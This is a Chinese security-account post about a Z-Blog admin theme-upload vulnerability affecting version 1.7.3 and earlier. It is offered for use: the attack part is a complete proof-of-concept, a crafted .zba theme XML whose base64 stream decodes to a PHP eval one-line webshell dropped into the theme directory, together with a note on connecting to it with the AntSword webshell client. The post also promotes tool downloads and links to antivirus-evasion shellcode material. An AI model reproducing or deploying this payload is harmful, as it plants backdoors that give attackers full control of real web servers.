#  【1day】Z-Blog 后台文件上传漏洞   
yijiu feng  夜组安全   2024-12-26 00:01  
  
免责声明  
  
由于传播、利用本公众号夜组安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号夜组安全及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
**所有工具安全性自测！！！VX：**  
**baobeiaini_ya**  
  
朋友们现在只对常读和星标的公众号才展示大图推送，建议大家把  
**夜组安全**  
“**设为星标**  
”，  
否则可能就看不到了啦！  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icZ1W9s2Jp2WrOMH4AFgkSfEFMOvvFuVKmDYdQjwJ9ekMm4jiasmWhBicHJngFY1USGOZfd3Xg4k3iamUOT5DcodvA/640?wx_fmt=png&from=appmsg "")  
  
  
**01**  
  
**漏洞描述**  
  
Affected version: Z-Blog  
  
Vendor: https://www.zblogcn.com/  
  
Software: https://www.zblogcn.com/program/zblogphp17/  
  
Vulnerability File: zba主题文件  
  
Z-Blog后台文件上传漏洞，影响版本1.7.3及以下 系统对主题文件代码没有做审查，导致将恶意代码写入主题文件后，被系统生成为文件。黑客可以利用这个漏洞，将恶意代码生成至网站目录，而后通过工具完全控制其主机。  
  
状态：严重  
  
**登陆管理后台后，通过上传精心构造的zba主题文件**，成功将木马存放至\zb_users\theme\shell\template\目录下，使用中国蚁剑连接成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icZ1W9s2Jp2WbO19REiasyrPGyModa7lFnheJMvfJ62ibsQMyUwMRkwfb6T3UBUKIq1maFxbloicvZGXbZE3H8qiasw/640?wx_fmt=png&from=appmsg "")  
  
  
**02**  
  
**漏洞POC**  
  
```
<?xml version="1.0" encoding="utf-8"?><app version="php" type="theme"><id>aymFreeFive</id><name>shell</name><url>https://xxx.xxx</url><note>shell</note><description>shell</description><path>settings/main.php</path><include>include.php</include><level>1</level><author><name>shell</name><email>iyuanma@qq.com</email><url>https://xxx.xxx/</url></author><source><name>shell</name><email>xxx@qq.com</email><url>https://xxx.xxx</url></source><adapted>1</adapted><version>1</version><pubdate>2024-12-05</pubdate><modified>2024-12-05</modified><price>0</price><phpver>5.5</phpver><advanced><dependency></dependency><rewritefunctions></rewritefunctions><existsfunctions></existsfunctions>
<conflict></conflict></advanced><sidebars><sidebar1></sidebar1><sidebar2></sidebar2><sidebar3></sidebar3><sidebar4></sidebar4><sidebar5></sidebar5><sidebar6></sidebar6><sidebar7></sidebar7><sidebar8></sidebar8><sidebar9></sidebar9></sidebars>
<folder><path>shell/scripts/</path></folder>
<folder><path>shell/settings/</path></folder>
<folder><path>shell/style/images/</path></folder>
<folder><path>shell/style/</path></folder>
<folder><path>shell/template/</path></folder>
<file><path>shell/template/shelll.php</path><stream>PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pID8+</stream></file>
<verify>aHR0cDovL2xvY2FsaG9zdC9ia2IvCkM6L3hhbXBwL2h0ZG9jcy9ia2Iv</verify></app>
```  
  
  
**03**  
  
**工具下载**  
  
**点击关注下方名片****进入公众号**  
  
**回复关键字【241226****】获取**  
**下载链接**  
  
  
**04**  
  
**往期精彩**  
  
[ 免费代理池收集工具，形成自己的免费代理池，让爬虫，渗透如虎添翼。 ](http://mp.weixin.qq.com/s?__biz=Mzk0ODM0NDIxNQ==&mid=2247493015&idx=1&sn=a074af224e7eb25a6e02d1207a41e2a6&chksm=c36ba16ff41c287970660cf7fb8b8a2ce747f2afdb776e7e3f704692969f59d321001e19957e&scene=21#wechat_redirect)  

						  
  
  
[ 基于先知社区知识构建的向量知识库 ](http://mp.weixin.qq.com/s?__biz=Mzk0ODM0NDIxNQ==&mid=2247493006&idx=1&sn=b868913b4b8eb4c10a8457ea43644ba4&chksm=c36ba176f41c28606c8de9b8ddfca22e1cf2064495185ca171d3c2014fa33a8d552f5940d1b0&scene=21#wechat_redirect)  

						  
  
  
[ 一款ShellCode在线免杀处理平台 ](http://mp.weixin.qq.com/s?__biz=Mzk0ODM0NDIxNQ==&mid=2247493004&idx=1&sn=da99824f8ad6992d7c1d4cfdb4407310&chksm=c36ba174f41c28624034fb5758eae0277a2f5dfe344835c7ae03d6015c8827c6ba6df725b4ca&scene=21#wechat_redirect)  

						  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAmMqjhMehrtxRQaYnbrvafmXHe0AwWLr2mdZxcg9wia7gVTfBbpfT6kR2xkjzsZ6bTTu5YCbytuoshPcddfsNg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&random=0.8399406679299557 "")  
  
  
